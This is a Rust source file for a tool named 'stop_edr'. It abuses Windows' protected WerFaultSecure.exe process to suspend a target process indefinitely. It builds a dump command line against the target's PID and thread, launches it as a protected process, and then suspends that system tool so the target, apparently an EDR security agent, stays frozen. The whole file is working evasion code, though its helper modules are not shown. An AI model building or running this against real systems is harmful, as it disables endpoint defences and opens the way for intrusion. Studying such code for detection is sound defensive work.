mod privilege;
mod core;
mod executor;

use clap::Parser;
use anyhow::{Context, Result};
use std::ffi::CString;
use windows::{
    core::{PCWSTR, PCSTR},
    Win32::Foundation::{CloseHandle, GetLastError, INVALID_HANDLE_VALUE},
    Win32::Storage::FileSystem::{
        CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_WRITE, CREATE_ALWAYS,
        DeleteFileW, FILE_SHARE_NONE
    },
    Win32::Security::SECURITY_ATTRIBUTES,
    Win32::System::Threading::{CreateEventW, Sleep},
    Win32::UI::WindowsAndMessaging::{MessageBoxA, MB_OK, MB_ICONINFORMATION},
};


use crate::{
    privilege::setup_permissions,
    core::{
        get_primary_thread_id, check_target_state,
        convert_handle, resume_process
    },
    executor::SystemExecutor,
};

#[derive(Parser, Debug)]
#[command(name = "stop_edr", about = "Process suspension tool")]
struct Args {
    /// Target process PID to suspend
    #[arg(short, long)]
    pid: u32,
    /// Duration to keep suspended in milliseconds (default: 10000)
    #[arg(short, long, default_value_t = 10_000)]
    sleep_ms: u64,
}

fn main() {
    let args = Args::parse();

    if let Err(e) = execute_suspension(args.pid, args.sleep_ms) {
        eprintln!("Error: {}", e);
        std::process::exit(1);
    }
}

/// Main function to suspend a process using system tools
pub fn execute_suspension(target_pid: u32, sleep_ms: u64) -> Result<()> {
    // Step 1: Setup required permissions
    setup_permissions().context("Failed to setup required permissions")?;

    // Step 2: Get primary thread ID of target process
    let target_tid = get_primary_thread_id(target_pid)
        .ok_or_else(|| anyhow::anyhow!("Could not locate primary thread for PID {}", target_pid))?;

    unsafe {
        // Step 3: Prepare security attributes for inheritable handles
        let sa = SECURITY_ATTRIBUTES {
            nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
            lpSecurityDescriptor: std::ptr::null_mut(),
            bInheritHandle: true.into()
        };

        // Step 4: Create file and event handles for system tool
        let (output_handle, output_name) = create_output_file(target_pid, &sa)?;
        let cancel_handle = create_control_event(&sa)?;

        // Step 5: Build system tool command line
        let tool_path = r"C:\Windows\System32\WerFaultSecure.exe";
        let command_line = format!(
            "{} /h /pid {} /tid {} /encfile {} /cancel {} /type 268310",
            tool_path,
            target_pid,
            target_tid,
            convert_handle(output_handle),
            convert_handle(cancel_handle)
        );

        //let command_line = r"calc.exe".to_string(); // Placeholder for testing
        // Step 6: Create protected process
        let mut creator = SystemExecutor::new();
        let tool_pid = creator.create_protected_process(0, &command_line)
            .context("Failed to create protected system process")?;

        // Step 7: Wait for target process to be suspended
        println!("Waiting for process {} to be suspended...", target_pid);

        let mut waited = 0;
        while !check_target_state(target_pid) && waited < 30000 {
            Sleep(100);
            waited += 100;
        }

        if check_target_state(target_pid) {
            println!("Target process suspended. PID: {}", target_pid);

            // Step 8: Suspend system tool to keep target frozen indefinitely
            if let Ok(_) = core::halt_process(tool_pid) {
                println!("System tool suspended. PID: {}", tool_pid);
            } else {
                eprintln!("Failed to suspend system tool: {:?}", GetLastError());
            }

            // Show success message
            let message = format!("Process {} suspended successfully!", target_pid);
            show_message_box(&message, "Success");

            println!("Keeping process suspended for {} ms...", sleep_ms);
            Sleep(sleep_ms as u32);
        } else {
            println!("Warning: Process may not be fully suspended");
        }

        // Step 9: Resume WerFault to allow target to resume automatically
        if let Ok(_) = resume_process(tool_pid) {
            println!("System tool resumed. Target will resume automatically. PID: {}", tool_pid);
        } else {
            eprintln!("Failed to resume system tool: {:?}", GetLastError());
        }

        // Cleanup file handles
        let _ = CloseHandle(output_handle);
        let _ = CloseHandle(cancel_handle);

        // Delete temporary output file (not needed)
        let wide_delete: Vec<u16> = output_name.encode_utf16().chain(std::iter::once(0)).collect();
        if DeleteFileW(PCWSTR(wide_delete.as_ptr())).is_ok() {
            println!("Temporary output file deleted successfully.");
        }
    }

    println!("Process suspension completed.");
    Ok(())
}


/// Create inheritable file handle for system tool (required but temporary)
fn create_output_file(target_pid: u32, sa: &SECURITY_ATTRIBUTES) -> Result<(windows::Win32::Foundation::HANDLE, String)> {
    let output_name = format!("temp_output_{}.txt", target_pid);
    let wide: Vec<u16> = output_name.encode_utf16().chain(std::iter::once(0)).collect();

    let handle = unsafe {
        CreateFileW(
            PCWSTR(wide.as_ptr()),
            FILE_GENERIC_WRITE.0,
            FILE_SHARE_NONE,
            Some(sa),
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            None
        )
    }.context("Failed to create temporary output file")?;

    if handle == INVALID_HANDLE_VALUE {
        anyhow::bail!("CreateFileW returned invalid handle");
    }

    Ok((handle, output_name))
}

/// Create control event for system tool
fn create_control_event(sa: &SECURITY_ATTRIBUTES) -> Result<windows::Win32::Foundation::HANDLE> {
    let handle = unsafe {
        CreateEventW(Some(sa), true, false, None)
    }.context("Failed to create cancellation event")?;

    Ok(handle)
}

/// Display a Windows MessageBox
fn show_message_box(message: &str, title: &str) {
    unsafe {
        if let (Ok(c_message), Ok(c_title)) = (CString::new(message), CString::new(title)) {
            let _ = MessageBoxA(
                None,
                PCSTR(c_message.as_ptr() as *const u8),
                PCSTR(c_title.as_ptr() as *const u8),
                MB_OK | MB_ICONINFORMATION,
            );
        }
    }
}